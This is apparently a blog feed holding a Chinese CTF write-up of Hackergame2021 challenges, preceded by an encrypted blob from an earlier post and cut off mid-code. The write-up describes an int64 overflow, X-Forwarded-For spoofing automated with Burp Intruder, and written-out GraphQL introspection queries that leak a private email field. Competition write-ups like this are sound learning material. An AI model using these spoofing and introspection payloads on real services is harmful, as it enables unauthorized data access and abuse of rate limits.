J5mkv9VRM5WGZFrxSIiIZ9M4PXNTErzxRB3008xdtbUrKqlBuoPWsRK4Cea4IdiOyyISAtallenfMlWGvNV1FNzKY1CliJRLtEErg+5UurywxwuMDerKcMx5c&#x2F;+3MoCtFTCLOp3JI8uL6M2qWbSuRFd1Q6PEEH&#x2F;QUTHtmxopXhztQ5zoclhcKKugfxhz1iQLVRohWD&#x2F;xnbjahebmp9pV836wIjebrltKo31KpluhberLabcbIBtGAqtT6BtadXtcwPX5ensTQNN7U6xPE4IAREcClVchuzQGalwss2s1si9D64RHkqX97txTJQ3Yk7xuGa+OmPCNPCGGadbEKbrhIPpCI&#x2F;3ryILqToozUfDjXQrzl3rvNyxAy9pwtcWj1iBGFN&#x2F;8JBkCBi0B+IspyFYk65RkOfiXE6X1I6IjjYyAUszYInPfOeY8RKrSnuxBj401BlRljYkTALlITzxAzVBytpxQwP4Ofhj1Gty8JVBdsveNvA2M6fw524lGFOadqThTqdP330aqL1HrJhhw&#x2F;cZo+wAYmvo9dgrbDLlK8yDyLtBhRmCQAnwf&#x2F;CtdVK3bqAlw2xr2S0tBNIq5dC&#x2F;9QU+yiJSJlf57Ui186BnzLNLmfkpWxU5oW3RnWXaM21bqNvrarqnqEKxcQiTTP6Le1BDhuoceKzzB7rPlMjPO6GUXO3pFaZfMgwwPmNBvFEnCEsLngzjObiJARrEmtV&#x2F;I5RRTUXMAwCK5ookoSFfFVfqTih36sJOaBCCDR+TEkQ3zQE2ZvV35OTb586cPbvp0B3Vd+RRnF79Z4+56etRg38pDY9EEFj&#x2F;&#x2F;trgxQ&#x2F;QkYclWHqeUWm5pKhFZ+g2qLMlVs1K0q8d6sSsvt0R7iuDZtNZZLd9D&#x2F;lxyz7rkGT7DpqTpOjvRZqG+VGquYaLFId+xE6nqPM8CEWz1&#x2F;NT8691a6XX7qCdWSm78nmrZ&#x2F;IX4IGGc5LZBLo8j9sf9lXqGNqSYKOjdkEIKswoYTfxRk4y4&#x2F;cWo9f5nIbP+Vaw2bjZ5WKespE4CTAOxpk7DHXxh5wzYPld6NqjdYiaz1+DbLWVSIeRfX0h+bbsFal6+gDJ8hM5bHc5xrlim+nCloZXuBhEsd9ZEEIiGdew&#x2F;l72jCnlfZH&#x2F;tfxshLOAvJY86uGsytRp3UkGtDmnloRtJJ4lYB3aoIgcuQSt9NzyqU&#x2F;sK8ivilobtO3s9+iDykFnLmtpI&#x2F;c&#x2F;wZMQ6na0GuyohYe397yya9UosBdt5jhumBxntnIPVeqKCdavin&#x2F;P5AGbWo8LowD2pGyD0pHR9ptBYDuuIv4&#x2F;tBuskdK3HQHPCOGIFj8Syqc9LG29IwtySpz&#x2F;AkBEIg+81UJ5V+b5r7&#x2F;jjlepp8ow049YyDcKzNP8HGAhfmYtEPb0zZKcd7ZyGYhID9RfUwHrPRSdSFuGDZhiBYhdrI2lpXaUgsbpho+CjUp74Dl6pl2RX+YNZSbl3P4wVfNBMlmOHWqJ8UEctbb&#x2F;DVoSjs3C0kptMRBbBSwK8uUi9AR+Y17Ruti5Li7Hcc4iQ7FDJ7wnkAXD3KSGZ&#x2F;OEvM1ghAazhRMeKANiZ&#x2F;CGSidJwBq+PdF3RbqsshaWWjVi6oq9JktiCI78yJuZ+funSupw&#x2F;M0YXKyiuXD6ZrxMcG5PjTWb&#x2F;FH5XR2QtUTSwq&#x2F;z1yYnhXTjtMjP6kex7yda58C&#x2F;QD+0YBdKhyMxuwSzOixS5ryofQ5cavR&#x2F;4zOBtxmDewhTSII+eLpgqFMdzZFnG7Bk4ot1AHPCOxA1bdEn3IzH9GQ7NMo3G4kskakXZC3K5QHcsgUr+&#x2F;8k8fY79Utp&#x2F;3sq&#x2F;MqTgeml7NAau0jhkGbMANcr4jZj3N4tBsmo&#x2F;InMiI7+H7k1fDa32BrzdoevMfJYA3PaDHFRFuoeDlWAnxAAyk11kKjnidwQ&#x2F;rBqIzrdIBMAfyfbrA55Q47SBe7fwVrzFRBPKtjICzBPKzlIU5&#x2F;xIfDo3IpEY8h6emLxN3dLLLuIBoCtm7MqkB9MA7hzlEwkGPY0oUwtH323Y43Y69s1ldtzi+J+tVbCJrz2y1VVo1sLtoRgxkTqjqCtJpOi2Q7JLLX1433EQ8tywYvxCjuBH4N8GVPsUCuZFVpUZ7kQEfpCCmRnyyIE8myFbHHKBqq369PP49Pv6OzpkbHJ2ZictG9Yoi85ahlyqbnSacOAIfRBnruBBqo4KwTbAgbesupr0cCPEEMfb0pdyhFFC91RfG0H0ASsdfZk66Jfd2TCjagq8&#x2F;CKoCP2Vi+GLsV3du38v9uELTX3j3gxskoyDeb020ElGDk3L0rl2fIh8fa68knJSWs2z17N09NtGlNLzdbCu9AXBtq+bdxEOZXWk8u1o+YlFRFjphBNf9eMM3itN1&#x2F;5wv2A3e++qsB3t3ZCyaz7ltIdzmy5us9lgNIo4h4ZYpHyUeuQbAqqb40v2w+0g1e&#x2F;+9jtQJfZM+T+LEs16v8UQMB2Pr5Ug4lULpuYga76cbN&#x2F;zebqqe5ABGYWEIBFM+bxLvNv6c3v0VREhA1QvSEqLeYR6OV15tOIzjpJf4dGP6URUYyIz1UlJkEQZSjUFCq2H76YOtieydin+5wXwB&#x2F;s+jicn09aE6B3OYtp2CDBsDOdTtoOOzfz85Ee1dLhL9ogTrbaxkF0w8HRyACovRiag31U05liMpzg1CMVrDQo5qRUAdcNyJEXkSPbY88iZ75h&#x2F;+9N8JhSeJQzxrhl5nhlR9jct9H0RP8fGdt1EGlHCMsxGRVmRBAxykf2bt5N6qnN6&#x2F;Sjdfi0oPDxWdi3Y9M9ZWxgbqt5Tg&#x2F;UW6v9EGe0+hA8Ii&#x2F;Bq5Idw&#x2F;gFR5jlnTwKdB58apXtbtaYnyU3T7dAWwtZ4OvIfv7&#x2F;gpPbeyS1TqY71Gib1CW&#x2F;lWfIO&#x2F;0H98bOHPDIl8Ut3fi5xQG0yqHgQS165tTf2xo1i1sqD6tNDhCIDu&#x2F;1uefrNO3ExZh3Ea9Ac3428&#x2F;GWPVHlg4sqLKlZPds5NfKh0df+VPT3OLPLCH55NQXFtqwE&#x2F;ZsCguOl42vTcKWrkXl71Gp+X5x+mdAu+H1KNhU3f6p&#x2F;5sXiLyWT+T7h4SGvyOeBLUwJer4tFpByMATG560KhAuixXyzXwv8j70CyJp8s399T+N8eQhAxhXVBxgWdtl6Eu+rBPWbHmZXEH1&#x2F;mghBG+RFwuCh4jNPDeQDOBewYrmimmbpmFt1Iqz&#x2F;fuI5eSH8zQLMuzPKYhEG4p+5kPdBQkQz4NWzlrQ0yE2pXBvPNPngsljuC3pAVjRrUVb7MZtuO3BXPeDSb+EXgylh5rBmG7bkk43bdQ4TQyNs&#x2F;FYt7cQ7tFzBQUhWoIDNWKiEs0hThjLY4Aw9zFxuF3Uf9H+fU7GlwZBrsU+QdPR0vKxB5EeyHUamO&#x2F;NYRd5RtFNym4HhMqSEoTQPqLv79hzNyMyMvbrkOly&#x2F;nIwAyXmBmaVTVwVZr1fT+zXgzQL+VY5ByLjJrDw4ghbk67RGlX0qTyXV4mXY41j+0YZioIDBDJHP7D8QHrhQpzOzhMyxkQ7WvTLWEaZqbvGSXN619WL1j9XZOecnOAZazEm0BawPD9vVCMar6VD01ZKHIQVY6+EmdhaWr9j4afovGGPIeFaLzg1YwA6czDMdWH0pbZmV539qrs+sX+toGO5fXI7buTnjvcbi85wKSPj1xlvSIVYD05WH9EX2S8IsJrdLqxVlG4IQj4TIzUpbKxuChuNjDQO0idakciMB9Mkg7ZEolOltVBvZWv47UhoMZHfECUqQARpkRfl8B3YW37L1ihQC1HVpGSI9EiqCLd6ZD0cjg6+E1JK3yDZ3pr0or57JCMX2U0Lf3G3zDiZ9E+kit5C4HsNPCA4Xq9qLcEnSTbUrwR&#x2F;+Ol6DndvqxVSUjYEJCrmqp&#x2F;Fi1CY2XgCle5ojZ9IAWjrbg01FGZMCi3iiSfILVNcl8q4ZZFLweZbi+TivrAC+zRX8cpdCBSMrdC5pCMsIPvzRLJNm+jY32VdintOlE4xMHTk9rr2uNKJ4hQKJREyoz7XCYJrlo9LYIcS2o9lKo3xjSkpnC0SFtg0Sy&#x2F;pcpZw8wyOO2hTXOTmKzyOlw7VH1LtxTB14XoT95Y7euHiB&#x2F;11oz+6uOb3uRm4iql1s+tXka5CfeFhSt9xk3k4S91VDa7f3akOPDdxCQ701qVjM5&#x2F;aat2ARuoYfoghi1AwKpuWYchdLoYSrOiXX91SeH4gOR5UP8KXg2TnNOTvpHN5LRBKm58rMDe7ZmZCNM4AnubKNBP&#x2F;X8UNMaIokp3+I6KpH0c3jmTnSHnLwoi5oqfNx&#x2F;qT2K7ePGq3nqfTkCDqWKSWTe+QG6BsOXetF9mSKh8lPJbru3DfzZ6ICHsZIpfy8Vcfks5Hk+LT44&#x2F;jwWR9xz0B&#x2F;ia2bB6mG7X5Wo5AfbIFSVtrwYmm&#x2F;bx5Mib9QOK1U2X9zav7ObfFmMpENUCxEi1tr+bVQt&#x2F;iubPbpFZ6DNce8msWvzHhhV+81gn&#x2F;QQ3YW+yq&#x2F;Sm5CTP9pMfI72Mt6XCYtr1a6b&#x2F;vWaKnBKOL7dS7w5ORYbH9GlxhtEv4s5wdh+uqDjIZJp4jTt8ysEikkyJg8vj60Ymgd4Q6GEytoArUF7MfNB&#x2F;hYcgcCEOiOcVTRWL&#x2F;sLMDeaSklA1i9tVBUP95ROYnHIR4qoKdqBsEAbGBfjnNMiSwqp&#x2F;pdZIvF0LtjzRxgD5&#x2F;BOvxZtq9zpu8WTP+InLqLtMkXXffeNwM7fKFvfb3RNQfXMPa8wNMLD80D3NyeVEJBZ3AZzhEKaruVZMfhbS&#x2F;Nmcec9GF2nWQm2L8+qLxWbi0OM1lXBuCvMZ5DU8u5tr12a&#x2F;vTwM0CP4gZ0ga9TSNVb2vfJdtHDuC9BSlTB7KcA&#x2F;&#x2F;xvozzLKhfZEUQvmOoyxtzthFSf&#x2F;b3KhAUgu5GzrMSPPiEGNFIWbqm0UF9j5GStLEXm9fOuFvefZw5mH5q0zoIr4cbLFjRjE67EkG0riIEpGjoSG5c3GTsALEhfkv2VpxhSbtucDmKnftpHxYZQcJ+Atg9MnlcZ2mLE2wi8TqJ&#x2F;Y8ODehHR6ocioUPGxZJblrquxAjAARnsqNZ1eIJIO2vOH83HUg0zGhfq4ag4DEEwIxczSRqNnMSuSta+O80zpla9CVaDwcLUG7KMyu0pTrwSLtuGgSa14iE+SQza7jIJs8PTwwRMb7N89oOaXs3QWsmlSybak0pgJ+pZLCiPQYHgD91kaTCRDOOz2sX1F4FSe4OP8ehuEH5vVhcg2&#x2F;FRn0w5AfPRhz30XstZkZrJzYWLNLcB1uPC1bR5YD44AgaRPWQQmLdkmRj8ea5siGd3aDEPDAfNUUatAzwBsfZKZUis2P5LbAJpTjbxbQ9&#x2F;Y8b9aqafukEV3Vs23IEyTx4uRWGUqbpP&#x2F;e9vr6gFGcjM80TkKrsoiG6CuySRQUnUPGAmco8TZwI1ETwthdL5Xh2D82vI1Q93Lh1n194uCSLKPbVIFgxONJIKyIJFfAU&#x2F;kP9Beqb+oLoBulIbDeechaTNfe8RrzZM&#x3D;</p>\n",
            "tags": [
                "Write-Up",
                "SchoolBus"
            ]
        },
        {
            "id": "http://cubicy.icu/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/",
            "url": "http://cubicy.icu/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/",
            "title": "Hackergame2021 部分WriteUp",
            "date_published": "2021-10-30T08:11:00.000Z",
            "content_html": "<h1 id=\"yyyのWriteUp\"><a href=\"#yyyのWriteUp\" class=\"headerlink\" title=\"yyyのWriteUp\"></a>yyyのWriteUp</h1><hr>\n<h2 id=\"一点碎碎念\"><a href=\"#一点碎碎念\" class=\"headerlink\" title=\"一点碎碎念\"></a>一点碎碎念</h2><p>这是我的第一次Hackergame&#x2F;CTF比赛，感觉很有意思。前几天心态有点崩，好在调整过来了。大家还是要把Hackergame当做game。最开心的是认识了好多大佬，抱大腿.jpg  </p>\n<p><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030161203937-1693462675.png\" loading=\"lazy\"></p>\n<p>对自己的吐槽：EasyRSA差点做出来，扩展欧几里得写错弃疗了；RAID0卡在软件没有激活码不让保存；和各种小测撞；各种体调不良，饮食睡眠不佳；晚上学校断电没法做，我又是大夜猫子……奇奇怪怪挡路的东西一直不少，归根结底还是太菜了啦。<br>总之非常感谢@TonyCrane大佬、GodSpeed大佬及群内各成员的鼓励支持帮助（膜不算）。<br>希望我能早日学会binary和math。  </p>\n<hr>\n<h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>这题二分一下page参数即可。<br><del>鼠标连点器</del>  </p>\n<hr>\n<h2 id=\"进制十六——参上\"><a href=\"#进制十六——参上\" class=\"headerlink\" title=\"进制十六——参上\"></a>进制十六——参上</h2><p>使用Hex Editor Neo直接新建文件抄写即可。当然OCR识别也行吧。</p>\n<hr>\n<h2 id=\"去吧！追寻自由的电波\"><a href=\"#去吧！追寻自由的电波\" class=\"headerlink\" title=\"去吧！追寻自由的电波\"></a>去吧！追寻自由的电波</h2><p>下载音频后可以听出是一段人声，但是语速极快。于是使用Adobe Audition CC打开，效果-&gt;伸缩与变调放慢速度，适当调节音高就能开始听写了。可以发现这是<strong>NATO Phonetic Alphabet</strong>：</p>\n<blockquote>\n<p>A ALPHA<br>B BRAVO<br>C CHARLIE<br>D DELTA<br>E ECHO<br>F FOXTROT<br>G GOLF<br>H HOTEL<br>I INDIA<br>J JULIET<br>K KILO<br>L LIMA<br>M MIKE<br>N NOVEMBER<br>O OSCAR<br>P PAPA<br>Q QUEBEC<br>R ROMEO<br>S SIERRA<br>T TANGO<br>U UNIFORM<br>V VICTOR<br>W WHISKEY<br>X X-RAY<br>Y YANKEE<br>Z ZULU  </p>\n</blockquote>\n<hr>\n<h2 id=\"猫咪问答-Pro-Max\"><a href=\"#猫咪问答-Pro-Max\" class=\"headerlink\" title=\"猫咪问答 Pro Max\"></a>猫咪问答 Pro Max</h2><p>General× 杂技√  </p>\n<h4 id=\"1-经典WebArchive-第一行就有答案-20150504\"><a href=\"#1-经典WebArchive-第一行就有答案-20150504\" class=\"headerlink\" title=\"1. 经典WebArchive 第一行就有答案:20150504\"></a>1. <a href=\"http://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes\">经典WebArchive</a> 第一行就有答案:20150504</h4><h4 id=\"2-https-lug-ustc-edu-cn-wiki-intro\"><a href=\"#2-https-lug-ustc-edu-cn-wiki-intro\" class=\"headerlink\" title=\"2. https://lug.ustc.edu.cn/wiki/intro/\"></a>2. <a href=\"https://lug.ustc.edu.cn/wiki/intro/\">https://lug.ustc.edu.cn/wiki/intro/</a></h4><blockquote>\n<p>此处资料显示是4次，但并非最新，我后来手动尝试才得知是5</p>\n</blockquote>\n<h4 id=\"3-FTP服务器-Obviously，答案是Development-Team-of-Library-后来得知网站首页news头图就有，我还找了好久\"><a href=\"#3-FTP服务器-Obviously，答案是Development-Team-of-Library-后来得知网站首页news头图就有，我还找了好久\" class=\"headerlink\" title=\"3. FTP服务器 Obviously，答案是Development Team of Library 后来得知网站首页news头图就有，我还找了好久\"></a>3. <a href=\"https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2016.06.16_%E6%B4%BB%E5%8A%A8%E5%AE%A4%E6%90%AC%E8%BF%81/IMG_20160616_133655.jpg\">FTP服务器</a> Obviously，答案是Development Team of Library <del>后来得知网站首页news头图就有，我还找了好久</del></h4><h4 id=\"4-谷歌关键词SIGBOVIK2021-Newcomb-Benford直接就能找到原论文http-sigbovik-org-2021-proceedings-pdf-直接Ctrl-F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13\"><a href=\"#4-谷歌关键词SIGBOVIK2021-Newcomb-Benford直接就能找到原论文http-sigbovik-org-2021-proceedings-pdf-直接Ctrl-F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13\" class=\"headerlink\" title=\"4. 谷歌关键词SIGBOVIK2021 Newcomb-Benford直接就能找到原论文http://sigbovik.org/2021/proceedings.pdf 直接Ctrl+F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13\"></a>4. 谷歌关键词<code>SIGBOVIK2021</code> <code>Newcomb-Benford</code>直接就能找到原论文<a href=\"http://sigbovik.org/2021/proceedings.pdf\">http://sigbovik.org/2021/proceedings.pdf</a> 直接<code>Ctrl+F</code>找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13</h4><h4 id=\"5-谷歌关键词protocol-report-找到https-www-rfc-editor-org-rfc-rfc8962-html\"><a href=\"#5-谷歌关键词protocol-report-找到https-www-rfc-editor-org-rfc-rfc8962-html\" class=\"headerlink\" title=\"5. 谷歌关键词protocol report 找到https://www.rfc-editor.org/rfc/rfc8962.html\"></a>5. 谷歌关键词<code>protocol</code> <code>report</code> 找到<a href=\"https://www.rfc-editor.org/rfc/rfc8962.html\">https://www.rfc-editor.org/rfc/rfc8962.html</a></h4><blockquote>\n<p> 6.Reporting Offenses<br>Send all your reports of possible violations and all tips about wrongdoing to <strong>&#x2F;dev&#x2F;null</strong>. The Protocol Police are listening and will take care of it.</p>\n</blockquote>\n<p><del>还挺幽默，一开始还真以为有police在listening</del></p>\n<hr>\n<h2 id=\"卖瓜\"><a href=\"#卖瓜\" class=\"headerlink\" title=\"卖瓜\"></a>卖瓜</h2><p>20不是3的倍数，乍看似乎不可能用6和9加和得到。但随便试了试，发现9斤的瓜很多很多时会溢出为-9223372036854775808，据此判断为int64溢出，判断应当在此处加以利用。<br>我们需要让这个数字稍微溢出一点，不能溢出太多。也就是略大于floor(9223372036854775808&#x2F;9)，使得溢出为-9223372036854775808以外的数字，并且让该数字到20的距离能被3整除。之后直接加回20就行（简单小学(?)算数，屡有即将做出来时加过头超过20的惨剧hhh）<br>灵感来源：<a href=\"https://www.bbsmax.com/A/pRdByjq65n/\">CTF 两道web整数溢出题目(猫咪银行和ltshop)</a>  </p>\n<hr>\n<h2 id=\"透明的文件\"><a href=\"#透明的文件\" class=\"headerlink\" title=\"透明的文件\"></a>透明的文件</h2><p>根据题面和文件会发现这是终端的颜色代码，网络搜索终端颜色代码格式后将所有<code>[</code>前补上一个<code>\\e</code>，然后<code>echo -e &quot;&#123;内容&#125;&quot;</code>就行啦。记得执行前把终端先用字符填满，不然可能画不完整。<br><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154901529-149476643.jpg\" loading=\"lazy\"></p>\n<hr>\n<h2 id=\"旅行照片\"><a href=\"#旅行照片\" class=\"headerlink\" title=\"旅行照片\"></a>旅行照片</h2><p><del>简简单单开个盒</del><br>旅游，海滩，汉字，说明这是国内一个海边旅游景点。<br>蓝色KFC？这可不常见，应该有不少人打卡了吧。<br>百度搜索<code>蓝色KFC</code>，第一项就是某红书的<code>秦皇岛蒂凡尼蓝秦皇岛网红打卡|国内唯一蒂芙尼蓝色肯德基</code><br>百度地图定位发现这家店是某海底世界分店，直接得到电话号码。<br><a href=\"https://www.earthol.org/\">https://www.earthol.org/</a>上通过街景发现三个汉字“海|豚|馆”<br><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154657507-2019993326.jpg\" loading=\"lazy\"></p>\n<p>对照地图，视线和海岸线大约成45°，推测应当在东南方向。进而发现影子西斜，应当在下午&#x2F;傍晚<br>通过绘制各个水平线找出灭点可以推测楼层（知乎有些文章有详细说明）。我的方法是找到对面楼“最矩形”变形最少的窗户判断为同一楼层，然后数，发现是13层左右（经尝试发现是14层）</p>\n<hr>\n<h2 id=\"FLAG助力大红包\"><a href=\"#FLAG助力大红包\" class=\"headerlink\" title=\"FLAG助力大红包\"></a>FLAG助力大红包</h2><p>既然是和ip有关，第一时间想到的就是<code>X-Forwarded-For</code>，果然成功了。因为每个<code>/8</code>ip段（也就是例如255.0.0.0-255.255.255.255）都只能算一次，我们使用BurpSuite的Intruder，将Post数据中的ip和<code>X-Forwarded-For</code>的ip首段打上标记，选择<code>Battering Ram</code>模式（让两处参数一致），构造0~255的字典，自动化访问<code>0.114.114.114</code>、<code>1.114.114.114</code>、<code>2.114.114.114</code>……<code>255.114.114.114</code>达成刚好256个助力获得flag。由于每次间隔2s，2s*256&#x3D;512s，小于题目时长限制10min&#x3D;600s所以是可行的。</p>\n<hr>\n<h2 id=\"Amnesia-轻度失忆\"><a href=\"#Amnesia-轻度失忆\" class=\"headerlink\" title=\"Amnesia-轻度失忆\"></a>Amnesia-轻度失忆</h2><p>直接<code>putchar()</code>逐个打印绕过即可。</p>\n<hr>\n<h2 id=\"图之上的信息\"><a href=\"#图之上的信息\" class=\"headerlink\" title=\"图之上的信息\"></a>图之上的信息</h2><p>GraphQL的利用。访问<code>/graphql?query=&#123;&#125;</code>发现存在利用可能。查阅<a href=\"https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ\">资料</a>后得知可以利用内省注入。没有UI界面我直接地址栏输入。换行替换为<code>%0A</code>后，访问<code>/graphql?query=&#123;__schema%0A&#123;types%0A&#123;name&#125;&#125;&#125;</code>得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;data&quot;:&#123;&quot;__schema&quot;:&#123;&quot;types&quot;:[&#123;&quot;name&quot;:&quot;Query&quot;&#125;,&#123;&quot;name&quot;:&quot;GNote&quot;&#125;,&#123;&quot;name&quot;:&quot;Int&quot;&#125;,&#123;&quot;name&quot;:&quot;String&quot;&#125;,&#123;&quot;name&quot;:&quot;GUser&quot;&#125;,&#123;&quot;name&quot;:&quot;Boolean&quot;&#125;,&#123;&quot;name&quot;:&quot;__Schema&quot;&#125;,&#123;&quot;name&quot;:&quot;__Type&quot;&#125;,&#123;&quot;name&quot;:&quot;__TypeKind&quot;&#125;,&#123;&quot;name&quot;:&quot;__Field&quot;&#125;,&#123;&quot;name&quot;:&quot;__InputValue&quot;&#125;,&#123;&quot;name&quot;:&quot;__EnumValue&quot;&#125;,&#123;&quot;name&quot;:&quot;__Directive&quot;&#125;,&#123;&quot;name&quot;:&quot;__DirectiveLocation&quot;&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>发现有个<code>GUser</code>类型。接下来访问<code>/graphql?query=&#123;__type(name:&quot;GUser&quot;)&#123;name%0Afields&#123;name%0Atype&#123;name,kind&#125;&#125;&#125;&#125;</code>爆出字段名<code>privateEmail</code>，然后直接<code>/graphql?query=&#123;user(id:1)&#123;id,privateEmail&#125;&#125;</code>得到flag.</p>\n<hr>\n<h2 id=\"赛博厨房\"><a href=\"#赛博厨房\" class=\"headerlink\" title=\"赛博厨房\"></a>赛博厨房</h2><ul>\n<li>Level0：直接写</li>\n<li>Level1：复制粘贴发现有长度限制 goto优化行数<br> 然后不会了。</li>\n</ul>\n<hr>\n<p>##阵列恢复大师-RAID5<br>直接丢进RAID Reconstructor 5里面跑得到镜像文件。Windows上并没法直接读，于是丢进Diskinternals Linux Reader里读文件导出。执行getflag.py却提示<code>Did you recover my data correctly?</code>，疑惑之下换WSL(Kali Linux)执行就成功了。<br><del>吐槽：RAID0的XFS需要注册码没法搞。WSL也mount不上，看来还是虚拟机靠谱。</del></p>\n<hr>\n<h2 id=\"助记词-第一顿大餐\"><a href=\"#助记词-第一顿大餐\" class=\"headerlink\" title=\"助记词-第一顿大餐\"></a>助记词-第一顿大餐</h2><p>代码审计后发现目的是延迟尽可能高。用BurpSuite改包在POST数据里复制出来很多行注记词提交就有了flag1。就像这样：  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[</span><br><span class=\"line\">    &quot;necessary science growth addition&quot;,</span><br><span class=\"line\">    &quot;necessary science growth addition&quot;,</span><br><span class=\"line\">    （重复好多好多次）</span><br><span class=\"line\">    &quot;necessary science growth addition&quot;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>如果不行CLEAR再试试。<br><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030155443141-1922071122.jpg\" loading=\"lazy\"></p>\n<p>小坑：token要跟上才能拿到flag，不过有时自动获取的token无效，使得flag只显示为true，因为加号没有URLEncode转义，不知道是不是bug.  </p>\n<hr>\n<h2 id=\"马赛克\"><a href=\"#马赛克\" class=\"headerlink\" title=\"马赛克\"></a>马赛克</h2><p>模拟题。大概思路是先扫一遍，把能确定的先确定下来。之后再dfs剩下的块（不需要全部求出，毕竟这题的二维码纠错拉满了）。<br>代码很丑对吧QAQ（当时不熟悉ndarray操作，全部当做list做一遍）  </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span 